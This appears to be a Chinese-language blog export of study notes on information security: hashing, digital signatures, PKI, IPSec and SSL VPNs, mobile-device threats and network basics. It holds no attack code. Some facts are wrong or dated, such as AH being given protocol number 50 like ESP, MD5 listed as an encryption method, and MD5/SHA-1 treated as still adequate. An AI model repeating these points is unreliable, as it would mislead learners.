<h1 id="1-4-散列函数与消息鉴别"><a href="#1-4-散列函数与消息鉴别" class="headerlink" title="1.4-散列函数与消息鉴别"></a>1.4-散列函数与消息鉴别</h1><h2 id="哈希函数（散列函数）"><a href="#哈希函数（散列函数）" class="headerlink" title="哈希函数（散列函数）"></a>哈希函数（散列函数）</h2><ul>
<li>哈希函数：将任意长度的输入，映射成较短的定长的的输出</li>
<li>作用：完整性校验</li>
<li>主要算法：MD5、SHA-1</li>
<li>数学性质：单向性、弱抗碰撞性、强抗碰撞性（碰撞即不同a、b有相同的hash值，如下）</li>
<li>原理：hash值同消息一起发送至接收者，接受者对该消息进行hash，看得到的新hash与旧hash是否一样，不一样则遭篡改</li>
</ul>
<h2 id="hash函数的特点"><a href="#hash函数的特点" class="headerlink" title="hash函数的特点"></a>hash函数的特点</h2><ul>
<li>H能够应用到任意长度的数据上</li>
<li>H能够生成大小固定的输出（较短</li>
<li>对于任意给定的x，H(x)的计算相对简单</li>
<li>对于给定的散列值h，要找到H(x)=h的x在计算上是不可行的（即单向性</li>
<li>对于给定的消息x，要找到另一个消息y满足H(y)=H(x)在计算上是不可行的（两个不同的输入，哪怕只有1b不同，经过hash后，也截然不同</li>
<li>MD5（输出是128b）、SHA（160b）</li>
<li>仍有缺陷：如MD5，输出只有128b，尽管很大，但是有限，而输入是无限的，无限对应有限，一定存在a、b不同，但hash值相同的情况，即碰撞（md5与sha-1都有碰撞的问题，只不过可能性不同，一个128b一个160b）</li>
<li>尽管存在碰撞，但仍使用，因为找两个hash值相同的a、b成本高（要清楚，在理论上是有缺陷的）</li>
</ul>
<h2 id="MD5算法"><a href="#MD5算法" class="headerlink" title="MD5算法"></a>MD5算法</h2><ul>
<li>message digest，消息摘要</li>
<li>输入：任意长度的消息（无限</li>
<li>输出：128b消息摘要（有限</li>
<li>处理：以512b作为块为单位</li>
</ul>
<h2 id="SHA-1算法"><a href="#SHA-1算法" class="headerlink" title="SHA-1算法"></a>SHA-1算法</h2><ul>
<li>secure hash algorithm，安全哈希算法，NIST开发，后经修订作为SHA-1，其基于MD4设计</li>
<li>输入：最大长度2的64次方 b</li>
<li>输出：160b消息摘要</li>
<li>处理：同MD5</li>
</ul>
<h2 id="SHA-1vs-MD5"><a href="#SHA-1vs-MD5" class="headerlink" title="SHA-1vs MD5"></a>SHA-1vs MD5</h2><ul>
<li>散列值长度：m-128b，s-160b</li>
<li>安全性：sha好一些，但其设计原则没有公开</li>
<li>速度：sha慢一些</li>
</ul>
<h2 id="消息鉴别"><a href="#消息鉴别" class="headerlink" title="消息鉴别"></a>消息鉴别</h2><ul>
<li>对收到的消息进行鉴别，证明确实是来自声称的发送方，且没有被修改过</li>
<li>作用：完整性校验、时间和顺序校验</li>
<li>消息认证方式：Message encryption、Hash function（常用，如上）、MAC</li>
<li>基于hash的消息，兼具有完整性，即hash可用于消息鉴别，看消息是否被篡改，hash还可用在web应用的密码上，密码不是明文存储，而是转为hash值后存储在数据库</li>
</ul>
<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><ul>
<li>附加在数据单元上的一些数据，或者对数据单元所做的密码变换，这种数据或者数据变换，能使数据单元的接收者确认数据单元的来源和完整性，并且保护数据防止被人伪造</li>
<li>作用：不可伪造性、不可否认性、保证消息完整性</li>
<li>基于RSA的数字签名——抗抵赖性<ul>
<li>用户A，发送者<ul>
<li>数据，经过hash算法，得到hash值</li>
<li>用户a私钥加密，得hash值的密文</li>
<li>密文随消息发送出去</li>
</ul>
</li>
<li>用户B，接收者<ul>
<li>得到数据+密文</li>
<li>取下密文，用户a公钥解密，得hash值1</li>
<li>取下数据，经过hash算法，得hash值2</li>
<li>若两hash值相同，说明未被篡改，保证完整性</li>
<li>也说明该数据是由用户A的私钥加密的，即用户A签名的，防止其抵赖</li>
</ul>
</li>
</ul>
</li>
<li>加密hash值得到的密文，即数字签名</li>
<li>数字签名功能：抗抵赖，保证完整性（如上</li>
<li>数字签名的基本条件<ul>
<li>签名者不能否认自己的签名</li>
<li>接收者能够验证签名，而其他任何人都不能伪造签名</li>
<li>当关于签名的真伪发生争执时，存在一个仲裁机构或第三方，能够解决争执</li>
</ul>
</li>
</ul>
<h1 id="1-5-密码学应用之PKI体系"><a href="#1-5-密码学应用之PKI体系" class="headerlink" title="1.5-密码学应用之PKI体系"></a>1.5-密码学应用之PKI体系</h1><p>（以上为基础）</p>
<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><ul>
<li><p>网络存在的典型安全隐患：假冒、窃听、篡改、冒名传送、否认传送……</p>
</li>
<li><p>信息安全要素举例</p>
<ul>
<li>你是谁？我是Tom——认证</li>
<li>怎么确定你就是你？口令是123——鉴别</li>
<li>我能干什么？你能干a，不能干b——授权</li>
<li>如何让别人无法偷听？我有密钥——机密性</li>
<li>如何保证不能被窜改？我有数字签名——完整性</li>
<li>我偷了机密文件，但我不承认。我有你的罪证——防抵赖（如上基于RSA的数字签名</li>
</ul>
</li>
<li><p>密码技术在信息安全中的作用</p>
<p>| 信息安全要素       | 威胁                             | 密码技术                                 |<br>| —————— | ——————————– | —————————————- |<br>| 机密性             | 窃听、非法窃取资料、敏感信息泄露 | 对称和非对称加密、数字信封               |<br>| 完整性             | 窜改、重放攻击、破坏             | 哈希函数和消息认证码、数据加密、数字签名 |<br>| 可鉴别性（身份认证 | 冒名                             | 口令和共享秘密、数字证书和数字签名       |<br>| 不可否认性         | 否认已收到、否认已发送           | 数字签名、证据存储                       |<br>| 授权与访问控制     | 非法存取资料、越权访问           | 属性证书、访问控制                       |</p>
</li>
<li><p>在公钥密码体系中</p>
<ul>
<li>a用b的公钥加密信息，b用b的私钥解密</li>
<li>那么对a来说，如何证明这个公钥是b的，即公钥与人身份的绑定</li>
<li>数字证书来证明</li>
<li>那数字证书的正确与否怎么保证，要有一个可靠的机构来颁发，引出CA-认证中心</li>
</ul>
</li>
</ul>
<h2 id="PKI-CA体系"><a href="#PKI-CA体系" class="headerlink" title="PKI/CA体系"></a>PKI/CA体系</h2><ul>
<li>PKI—公钥基础设施，CA—认证中心</li>
<li><p>PKI，public key infrastructure</p>
<ul>
<li>建立在公开密钥技术的基础上</li>
<li>提供信息安全服务</li>
<li>利用加密、数字签名、数字证书等技术来保障安全</li>
<li>一种在线基础设施，同电力基础设施</li>
</ul>
</li>
<li><p>PKI/CA</p>
<ul>
<li>建立在公开密钥技术的基础上</li>
<li>硬件、软件、人员和应用程序的集合</li>
<li>具备生产、管理、存储、核发、废止等证书管理能力</li>
<li>从运营、管理、规范、法律、人员等多个角度，来解决网络信任问题</li>
</ul>
</li>
<li><p>PKI体系对象-四类实体</p>
<ul>
<li>CA—认证权威（证书的认证机构</li>
<li>RA—注册权威（证书的注册机构</li>
<li>证书存放管理（目录服务</li>
<li>证书持有者和应用程序<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2></li>
</ul>
</li>
<li><p>是什么</p>
<ul>
<li>一段电子数据</li>
<li>经证书权威机构CA签名</li>
<li>包含拥有者身份信息和公开密钥的数据体</li>
</ul>
</li>
<li><p>格式：国际标准X.509定义</p>
</li>
<li><p>生命周期：证书申请、生成、存储、发布、废止</p>
</li>
<li><p>基本内容</p>
<ul>
<li>颁证机构（CA是谁？谁颁的？</li>
<li>证书颁发机构的签名</li>
<li>证书持有者名字（颁给谁的？）</li>
<li>证书持有者的公钥（标识</li>
<li>证书有效期</li>
</ul>
</li>
<li><p>（科普，12306自己专门有CA，故好多浏览器会提示不安全</p>
</li>
<li>不同类型的证书<ul>
<li>根证书</li>
<li>个人证书（银行USB-key</li>
<li>代码签名证书</li>
<li>服务器证书（即常见网站证书</li>
</ul>
</li>
</ul>
<h2 id="CA：证书发放机构"><a href="#CA：证书发放机构" class="headerlink" title="CA：证书发放机构"></a>CA：证书发放机构</h2><ul>
<li>是PKI的核心</li>
<li>主要功能<ul>
<li>签发数字证书<ul>
<li>签发</li>
<li>更新</li>
</ul>
</li>
<li>管理数字证书<ul>
<li>撤销、查询</li>
<li>审计、统计</li>
</ul>
</li>
<li>验证数字证书<ul>
<li>黑名单验证（CRL</li>
<li>在线认证（OCSP</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="RA：证书注册机构"><a href="#RA：证书注册机构" class="headerlink" title="RA：证书注册机构"></a>RA：证书注册机构</h2><ul>
<li>证书注册权威，Registration Authority</li>
<li>受理用户的数字证书申请<ul>
<li>对证书申请者进行审核并提交CA制证</li>
<li>类似申请身份证的派出所</li>
</ul>
</li>
<li>提供证书生命期的维护工作<ul>
<li>受理证书申请、更新、吊销请求</li>
<li>协助颁发用户证书</li>
<li>审核用户真实身份</li>
</ul>
</li>
</ul>
<h2 id="目录服务"><a href="#目录服务" class="headerlink" title="目录服务"></a>目录服务</h2><ul>
<li>信息的存储库，证书的保存、修改、删除和获取</li>
<li>CA采用LDAP标准的目录服务，来存放证书，作用类似于数据库，优点是：在修改操作少的情况下，访问效率比传统数据库要高</li>
</ul>
<h2 id="CRL"><a href="#CRL" class="headerlink" title="CRL"></a>CRL</h2><ul>
<li>certificate revocation list，证书撤销列表，即证书黑名单</li>
<li>在证书的有效期间，因某原因（人员调动、私钥泄露），导致证书不再真实可信，此时进行证书撤销，说明此证书无效</li>
<li>CRL中列出了被撤销的证书序列号</li>
</ul>
<h2 id="PKI-CA的典型应用"><a href="#PKI-CA的典型应用" class="headerlink" title="PKI/CA的典型应用"></a>PKI/CA的典型应用</h2><ul>
<li>电子商务领域：银行、网购</li>
<li>电子政务：公文扭转、政务门户</li>
<li>访问控制：门禁（物理）、win登录（逻辑</li>
<li>硬件设备：web服务器、域名控制器、VPN</li>
<li>通信：Wi-Fi部署</li>
<li>软件开发领域：代码签名</li>
</ul>
<h2 id="CA工作流程"><a href="#CA工作流程" class="headerlink" title="CA工作流程"></a>CA工作流程</h2><p>怎么连接的：（联想图</p>
<p>用户A——RA——CA——目录服务器——应用程序等其他用户</p>
<ul>
<li>用户A想要申请证书</li>
<li>发送注册信息给RA</li>
<li>RA审核用户身份</li>
<li>审核通过的注册请求发送给CA</li>
<li>CA为用户A签发证书下载凭证，通过RA转交给用户A（并未实际制作证书，只是说可以凭证去下载了）</li>
<li>用户A生成公钥私钥对</li>
<li>将公钥交给CA，此时CA既有公钥信息，又有身份信息，就可以制作证书了</li>
<li>用户A凭借下载凭证，将证书下载到本地</li>
<li>同时，CA为了管理证书，将证书公布出去，即发到其连接的目录服务器中</li>
<li>其他的应用程序就可以通过在目录服务器中的证书：<ul>
<li>获取用户的身份信息</li>
<li>进行证书废止检查</li>
<li>检查证书有效期</li>
<li>解密数据</li>
</ul>
</li>
</ul>
<h1 id="1-6-密码学应用之VPN体系"><a href="#1-6-密码学应用之VPN体系" class="headerlink" title="1.6-密码学应用之VPN体系"></a>1.6-密码学应用之VPN体系</h1><ul>
<li>虚拟专用网络，virtual private network</li>
<li>解决出差员工、合作伙伴接入公司局域网的问题</li>
</ul>
<h2 id="VPN的类型"><a href="#VPN的类型" class="headerlink" title="VPN的类型"></a>VPN的类型</h2><ul>
<li>按协议层次：二层、三层、四层、应用层VPN</li>
<li>按应用范围：远程访问VPN、内联网VPN、外联网VPN</li>
<li>按体系结构：网关到网关VPN、主机到网关VPN、主机到主机VPN</li>
</ul>
<h2 id="工作原理及关键技术"><a href="#工作原理及关键技术" class="headerlink" title="工作原理及关键技术"></a>工作原理及关键技术</h2><ul>
<li>隧道技术</li>
<li>加解密技术</li>
<li>密钥管理技术</li>
<li>使用者与设备身份认证技术</li>
<li>访问控制技术</li>
</ul>
<h2 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h2><ul>
<li>本质区别在于：用户在隧道中传输的数据包，是被封装在哪种数据包中（隧道技术即再封装）</li>
<li>按拓扑结构分为点对点隧道和点对多隧道，VPN主要采用点对点隧道</li>
<li>目前有多种VPN隧道：L2TP、PPTP（二层）、IPSec（三层）、MPLS、SSL（传输层</li>
</ul>
<h2 id="VPN有关协议的工作原理"><a href="#VPN有关协议的工作原理" class="headerlink" title="VPN有关协议的工作原理"></a>VPN有关协议的工作原理</h2><ul>
<li>二层隧道协议：主要有三种<ul>
<li>PPTP：微软、Ascend、3COM等公司支持</li>
<li>L2F：Cisco、北方电信等公司支持，在disco路由器中有支持</li>
<li>L2PT：由IETF起草，微软、Ascend等公司参于，结合上述两协议优点，成为二层隧道协议的工业标准</li>
</ul>
</li>
<li>IPSec协议<ul>
<li>是一个协议包，而非单个协议，已积累大量标准文件集</li>
<li>安全协议由三个主要协议组成：加密、认证算法</li>
<li>internet安全协商和密钥管理协议（ISAKMP）是其另一个重要组件；ISAKMP提供了用于应用层服务的通用格式，他支持IPSec协议放的密钥管理需求</li>
</ul>
</li>
<li>SSL协议</li>
<li></li>
</ul>
<h2 id="IPSec协议体系"><a href="#IPSec协议体系" class="headerlink" title="IPSec协议体系"></a>IPSec协议体系</h2><p>（可分为两大类</p>
<ul>
<li>封装协议：<ul>
<li>封装协议定义了IPSec数据包的数据结构、加密和认证结构</li>
<li>支持两种封装协议：ESP、AH</li>
<li>不同类型的VPN结构，IPSec提供两种模式的封装：Tunnel和Transport</li>
</ul>
</li>
<li>密钥管理协议：IKE</li>
</ul>
<h2 id="AH认证头部"><a href="#AH认证头部" class="headerlink" title="AH认证头部"></a>AH认证头部</h2><ul>
<li>AH主要提供数据来源认证、数据完整性验证和防报文回放攻击功能</li>
<li>AH不提供机密性保证</li>
<li>使用50作为协议号</li>
<li>包含两种模式：传输模式和隧道模式<ul>
<li>隧道模式：需要为每个包创建一个新的IP包头</li>
<li>传输模式：不需要创建新的IP包头</li>
</ul>
</li>
</ul>
<h2 id="AH隧道模式封装结构"><a href="#AH隧道模式封装结构" class="headerlink" title="AH隧道模式封装结构"></a>AH隧道模式封装结构</h2><ul>
<li>旧：IP包头+数据</li>
<li>新：新IP包头+AH +原IP包头+数据</li>
<li>即新IP报头+AH报头+原IP报头+TCP/UDP报头+应用程序数据</li>
<li>其中AH报头=下一个报头+长度+安全参数索引（SPI）+序列号+认证数据（hash检查和</li>
</ul>
<h2 id="AH传输模式封装结构"><a href="#AH传输模式封装结构" class="headerlink" title="AH传输模式封装结构"></a>AH传输模式封装结构</h2><ul>
<li>旧：IP包头+数据</li>
<li>新：IP包头+AH+数据（二者之间插入AH，并不添加新IP报头</li>
<li>即：IP报头+AH报头++TCP/UDP报头+应用程序数据</li>
<li>其中AH报头=下一个报头+长度+安全参数索引（SPI）+序列号+认证数据（hash检查和</li>
</ul>
<h2 id="负载安全封装ESP"><a href="#负载安全封装ESP" class="headerlink" title="负载安全封装ESP"></a>负载安全封装ESP</h2><ul>
<li>除了AH协议有的功能外，ESP还提供对IP报文的加密功能</li>
<li>可以：加密IP包后面的所有数据</li>
<li>使用50作为协议号</li>
<li>两种模式：隧道模式和传输模式</li>
</ul>
<h2 id="ESP隧道模式封装结构"><a href="#ESP隧道模式封装结构" class="headerlink" title="ESP隧道模式封装结构"></a>ESP隧道模式封装结构</h2><ul>
<li>旧：IP包头+数据</li>
<li>新：新IP包头+ESP头+加密（原IP包头+数据）+ESP尾部+ESP验证</li>
</ul>
<h2 id="ESP传输模式封装"><a href="#ESP传输模式封装" class="headerlink" title="ESP传输模式封装"></a>ESP传输模式封装</h2><ul>
<li>旧：IP包头+数据</li>
<li>新：IP包头+ESP头+加密（数据）+ESP尾部+ESP验证（esp头插入二者之间，只对数据进行加密）</li>
</ul>
<h2 id="SA-安全联盟"><a href="#SA-安全联盟" class="headerlink" title="SA-安全联盟"></a>SA-安全联盟</h2><ul>
<li>安全联盟SA是构成IPSec的基础</li>
<li>SA是两个通信实体经过协商建立起来的一种协定。<ul>
<li>决定了用来保护数据包安全的IPSec协议（esp或ah模式transport或tunnel）</li>
<li>转码方式（加密方式md5、aes、des</li>
<li>密钥及密钥的有效时间</li>
</ul>
</li>
<li>任何IPSec实施方案始终会构建一个SA数据库，即SADB，由它来维护IPSec协议，用来保障数据包安全的sa记录</li>
</ul>
<h2 id="SA-安全联盟如何建立"><a href="#SA-安全联盟如何建立" class="headerlink" title="SA 安全联盟如何建立"></a>SA 安全联盟如何建立</h2><ul>
<li>SA的创建可以由管理员人工的配置完成</li>
<li>但，手工维护易出错，而且手工建立的SA没有生存周期限制，永不过期，除非手工删除，因此有安全隐患</li>
<li>SA的创建也可以通过某些协议来自动协商完成</li>
<li>动态完成，可以解决手工配置的问题</li>
</ul>
<h2 id="IKE"><a href="#IKE" class="headerlink" title="IKE"></a>IKE</h2><ul>
<li>internet key exchange</li>
<li>能自动的实现密钥的交换，简化了手工配置的复杂性，同时也解决了IPsec难以扩展的特性</li>
<li>主要功能：<ul>
<li>协商SA的安全特性</li>
<li>密钥的自动生成</li>
<li>易于管理和配置</li>
</ul>
</li>
</ul>
<h2 id="ISAKMP协议"><a href="#ISAKMP协议" class="headerlink" title="ISAKMP协议"></a>ISAKMP协议</h2><ul>
<li>安全联盟密钥管理协议，RFC2408</li>
<li>定义了协商、建立、修改和删除SA的过程和包格式</li>
<li>其只是为协商、修改、删除SA的方法提供了一个通用的框架，并没有定义具体的SA格式</li>
<li>这个通用的框架是与密钥交换独立的，可以被不同的密钥交换协议使用</li>
<li>可以利用UDP或TCP，端口都是500，一般情况用UDP</li>
</ul>
<h2 id="ISAKMP协商阶段和协商模式"><a href="#ISAKMP协商阶段和协商模式" class="headerlink" title="ISAKMP协商阶段和协商模式"></a>ISAKMP协商阶段和协商模式</h2><ul>
<li>阶段1：    <ul>
<li>认证对等体</li>
<li>协商安全联盟</li>
<li>两种模式：main mode和aggressive mode</li>
</ul>
</li>
<li>阶段2:<ul>
<li>协商IPSec SAs/SPIs</li>
<li>单一工作模式：快速模式</li>
</ul>
</li>
</ul>
<h2 id="IKE补充"><a href="#IKE补充" class="headerlink" title="IKE补充"></a>IKE补充</h2><ul>
<li>IKE阶段一完成后会产生一个共享密钥，用于阶段2的数据加密使用</li>
<li>IKE第一阶段–协商SA参数（用DH，SA交换、密钥交换、ID交换等工作</li>
</ul>
<h2 id="IPSec与IKE的关系"><a href="#IPSec与IKE的关系" class="headerlink" title="IPSec与IKE的关系"></a>IPSec与IKE的关系</h2><h2 id="SSL协议"><a href="#SSL协议" class="headerlink" title="SSL协议"></a>SSL协议</h2><ul>
<li><p>SSL，secure socket layer，安全套接协议，netscape提出</p>
</li>
<li><p>TLS，transport layer security，IETF的TLS工作组基于SSL3.0提出的</p>
</li>
<li><p>使用公开密钥体制和X.509数字证书技术保护信息传输的机密性和完整性，适用于点对点之间的信息传输，常用web server方式</p>
</li>
<li><p>位于TCP上、应用层下，为上层应用在网络间建立一条安全通道</p>
</li>
<li><p>可以独立与应用层，从而使应用层协议可以直接建立在SSL上</p>
</li>
<li><p>提供：服务器认证、客户认证（可选）、链路上的数据完整性和数据保密性等保护功能</p>
</li>
<li><p>包含：SSL记录协议、SSL握手协议、SSL更改密码说明协议、SSL警告协议</p>
</li>
<li><p>SSL记录协议：所有的传输数据都被封装在记录中，提供机密性和完整性两种服务</p>
</li>
<li><p>SSL记录协议：包括记录头和记录数据格式</p>
</li>
<li><p>SSL握手协议：使服务器和客户端相互认证身份、协商加密和MAC算法以及用来保护在SSL记录中发送数据的加密应用，在传输数据前，必须使用握手协议</p>
</li>
<li><p>SSL handshake protocol</p>
<ul>
<li>鉴别、协商加密算法和密钥</li>
<li>提供连接安全性<ul>
<li>身份鉴别，单向/双向鉴别</li>
<li>协议过程可靠，防中间人攻击</li>
<li>协商密钥安全</li>
</ul>
</li>
</ul>
</li>
<li><p>SSL record protocol</p>
<ul>
<li>在TCP之上，用来封装更高层的协议</li>
<li>提供连接安全性<ul>
<li>保密性，使用了对称密码算法</li>
<li>完整性，使用HMAC算法</li>
</ul>
</li>
</ul>
</li>
<li><p>SSL协议安全性</p>
<ul>
<li><p>保密性</p>
<ul>
<li>对于每个连接都有唯一的会话密码</li>
<li>采用对称密码体制加密会话数据</li>
</ul>
</li>
<li><p>完整性</p>
<ul>
<li>保障传输数据完整性    </li>
<li>采用HMAC</li>
</ul>
</li>
<li>可鉴别性<ul>
<li>使用非对称算法，支持使用数字证书鉴别</li>
<li>单向、双向鉴别</li>
</ul>
</li>
</ul>
</li>
<li><p>通信过程……</p>
</li>
<li><p>HTTPS：保护web通信</p>
</li>
</ul>
<h2 id="IPSec-VPN和SSL-VPN的比较"><a href="#IPSec-VPN和SSL-VPN的比较" class="headerlink" title="IPSec VPN和SSL VPN的比较"></a>IPSec VPN和SSL VPN的比较</h2><table>
<thead>
<tr>
<th>项目÷</th>
<th>IPSec VPN</th>
<th>SSL VPN</th>
</tr>
</thead>
<tbody>
<tr>
<td>身份验证</td>
<td>双向/数字证书</td>
<td>单/双向数字证书</td>
</tr>
<tr>
<td>加密</td>
<td>依靠执行加密</td>
<td>基于web浏览器加密</td>
</tr>
<tr>
<td>全程安全性</td>
<td>端到边缘</td>
<td>端到端/用户到资源</td>
</tr>
<tr>
<td>可访问性</td>
<td>已经定义好受控用户</td>
<td>任何时间/地点</td>
</tr>
<tr>
<td>费用</td>
<td>高</td>
<td>低</td>
</tr>
<tr>
<td>安装</td>
<td>需要长时间配置</td>
<td>即插即用</td>
</tr>
<tr>
<td>易用性</td>
<td>需要培训</td>
<td>简单友好</td>
</tr>
<tr>
<td>应用支持</td>
<td>所有基于IP协议的服务</td>
<td>HTTP/TELNET/NMTP/FTP</td>
</tr>
<tr>
<td>用户</td>
<td>适合于企业内部使用</td>
<td>客户/合作伙伴/供应商</td>
</tr>
</tbody>
</table>
<p>可伸缩性    ——比较困呐——容易配置和扩展</p>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之移动终端安全</title>
    <url>/2018/07/05/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E7%A7%BB%E5%8A%A8%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="6-移动智能终端安全防护"><a href="#6-移动智能终端安全防护" class="headerlink" title="6-移动智能终端安全防护"></a>6-移动智能终端安全防护</h1><ul>
<li>目录<ul>
<li>移动智能终端</li>
<li>移动智能终端安全威胁</li>
<li>移动智能终端的安全使用</li>
</ul>
</li>
</ul>
<a id="more"></a>
<h2 id="6-1-移动智能终端"><a href="#6-1-移动智能终端" class="headerlink" title="6.1-移动智能终端"></a>6.1-移动智能终端</h2><ul>
<li><p>定义</p>
<ul>
<li>是指具有独立操作系统、可安装应用程序、使用无线局域网或移动通信网访问因特网的设备，如智能手机和平板电脑</li>
</ul>
</li>
<li><p>逻辑结构</p>
<ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-20/21084415.jpg" alt></p>
</li>
</ul>
</li>
<li><p>分类</p>
<ul>
<li>智能手机</li>
<li>平板电脑</li>
</ul>
</li>
<li><p>功能</p>
<ul>
<li>能够访问不同模式下的移动通信网络</li>
<li>能够通过不同的网络接口访问因特网</li>
<li>具有开放的API接口</li>
<li>支持多任务</li>
<li>具有多媒体功能</li>
<li>具有GPS导航功能</li>
</ul>
</li>
<li><p>特点</p>
<ul>
<li>具备一个具有开放性的操作系统平台，可以安装更多的应用程序，从而终端智能的功能得到无限扩充</li>
<li>具备PAD功能，包括PIM（个人信息管理）、日程记事、任务安排、多媒体应用、浏览网页</li>
<li>具备无线接入互联网的能力，即需要支持GSM网络下的GPRS或者CDMA网络下的CDMA1X或3G网络</li>
<li>功能强大，扩展性强，支持多个第三方软件</li>
</ul>
</li>
</ul>
<h2 id="6-2-移动智能终端安全威胁"><a href="#6-2-移动智能终端安全威胁" class="headerlink" title="6.2-移动智能终端安全威胁"></a>6.2-移动智能终端安全威胁</h2><ul>
<li><p>安全形势</p>
<ul>
<li>智能终端操作系统敏感权限滥用</li>
<li>应用软件难溯源</li>
<li>智能终端操作系统漏洞</li>
<li>智能终端操作系统后门</li>
</ul>
</li>
<li><p>主要威胁</p>
<ul>
<li>伪基站攻击</li>
<li>二维码扫描</li>
<li>移动终端遗失</li>
<li>手机病毒</li>
<li>恶意扣费软件</li>
</ul>
</li>
<li><p>伪基站攻击</p>
<ul>
<li>伪基站即假基站，设备一般由主机和笔记本电脑或手机组成</li>
<li>通过短信群发器、短信发信机等相关设备能够搜取以其为中心、一定半径范围内的手机卡信息，利用2G移动通信的缺陷，通过伪造成运营商的基站，冒用他人手机号码强行向用户手机发送诈骗、广告等短信息</li>
</ul>
</li>
<li><p>伪基站工作流程</p>
<ul>
<li><p>图示</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-20/90404511.jpg" alt></p>
</li>
</ul>
</li>
<li><p>二维码扫描</p>
<ul>
<li>二维码使指在一维条码的基础上扩展出来的另一种具有可读性的条码</li>
<li>二维码使用黑白色图案表示二进制数据</li>
</ul>
</li>
<li><p>二维码基本特点</p>
<ul>
<li>信息量大，编码范围广</li>
<li>容错能力强，译码可靠性高</li>
<li>编译简便，成本低</li>
</ul>
</li>
<li><p>二维码带来的安全问题</p>
<ul>
<li>成为病毒木马、钓鱼网站传播新渠道</li>
<li>二维码信息更容易泄露</li>
<li>对二维码的监管力度不够</li>
<li>二维码成为违法信息的传播新方式</li>
<li>二维码与移动支付结合，成为金融诈骗新手段</li>
</ul>
</li>
<li><p>移动终端遗失（手机丢失后要做</p>
<ul>
<li>致电运营商挂失手机号</li>
<li>致电银行冻结手机网银</li>
<li>微信用户冻结其账号</li>
<li>修改微博、微信、等密码</li>
<li>到手机运营商处补手机卡</li>
</ul>
</li>
<li><p>手机病毒</p>
<ul>
<li>手机病毒是一种具有传染性、破坏性的手机程序</li>
<li>手机病毒可通过短信、彩信电子邮件和蓝牙等方式进行传播，常常伪造成手机软件和系统程序诱骗用户下载</li>
</ul>
</li>
<li><p>手机病毒的危害</p>
<ul>
<li>窃取用户信息</li>
<li>用户信息丢失</li>
<li>破坏手机硬件</li>
<li>发送垃圾信息</li>
</ul>
</li>
</ul>
<ul>
<li>恶意扣费软件<ul>
<li>恶意扣费软件是指没有对用户进行任何提示，通过发送短信或联网等方式强制扣除用户手机话费的软件</li>
</ul>
</li>
</ul>
<ul>
<li><p>思考</p>
<ul>
<li><p>伪基站发送的垃圾短信中发信人号码使可以任意伪造的吗？</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-20/97536367.jpg" alt></p>
</li>
<li><p>若只是扫描了位置来源的二维码，会造成手机中毒吗？</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/17-12-20/99877668.jpg" alt></p>
</li>
</ul>
</li>
</ul>
<h2 id="6-3-移动智能终端的安全使用"><a href="#6-3-移动智能终端的安全使用" class="headerlink" title="6.3-移动智能终端的安全使用"></a>6.3-移动智能终端的安全使用</h2><ul>
<li><p>移动终端安全使用建议</p>
<ul>
<li>数以隐私权限访问请求</li>
<li>慎重扫描二维码<ul>
<li>不要见码就扫</li>
<li>不要随意晒码和丢弃含有二维码的票据</li>
</ul>
</li>
<li>从正规渠道下载应用</li>
<li>安装安全防护软件</li>
<li>定期备份</li>
<li>不要登录到不安全的无线网络</li>
<li>尽量避免访问财务或银行信息</li>
<li>在网上浏览时不要选择记住我</li>
<li>清空历史记录和缓存内容</li>
<li>启动用户认证</li>
<li>谨慎对待陌生信息</li>
<li>注意安全管理终端</li>
</ul>
</li>
<li><p>思考</p>
<ul>
<li><p>与台式机相比，移动智能终端面临的安全问题有那些特点？</p>
<ul>
<li>移动智能终端尺寸小，可移动性强，所处环境复杂而不确定，存储的信息大多是个人隐私信息</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>
<li><p>为了防止因手机丢失而造成信息泄密，可以对手机进行哪些设置？</p>
<ul>
<li>设置开机密码</li>
<li>单独绑定手机的账号和密码，如微信尽量不要直接绑定登录修改成输入密码的方式</li>
<li>装手机安全软件</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>信息安全基础</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title>信息安全之网络安全防护技术</title>
    <url>/2018/07/05/base/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B9%8B%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h1 id="3-网络安全防护技术"><a href="#3-网络安全防护技术" class="headerlink" title="3-网络安全防护技术"></a>3-网络安全防护技术</h1><ul>
<li>目录<ul>
<li>网络基础知识</li>
<li>网络安全威胁</li>
<li>网络安全防护与实践</li>
<li>无线局域网安全防护</li>
</ul>
</li>
</ul>
<h2 id="3-1-网络基础知识"><a href="#3-1-网络基础知识" class="headerlink" title="3.1-网络基础知识"></a>3.1-网络基础知识</h2><a id="more"></a>
<ul>
<li><p>Internet和TCP/IP协议</p>
<ul>
<li>因特网（Internet）通过TCP/IP协议将遍布在全世界的计算机互联，从而形成超级计算机网络</li>
</ul>
</li>
<li><p>何为协议？</p>
<ul>
<li>协议是一种约定</li>
<li>大家预先约定好规则，之后都按照这同一个规则执行</li>
<li>就像多家公司合作，一开始要签协议似的</li>
</ul>
</li>
<li><p>何为协议？（续）</p>
<ul>
<li>网络中的协议，protocol，是指实现约定或定义的一组通信规则</li>
<li>它精确的规定了所交换数据的格式和传输方法</li>
<li>不同网络必须遵守统一的协议才能相互通信</li>
<li>TCP/IP是一组不同层次上的多个协议组合</li>
<li>其定义了电子设备如何接入互联网，以及数据如何在他们之间传输</li>
</ul>
</li>
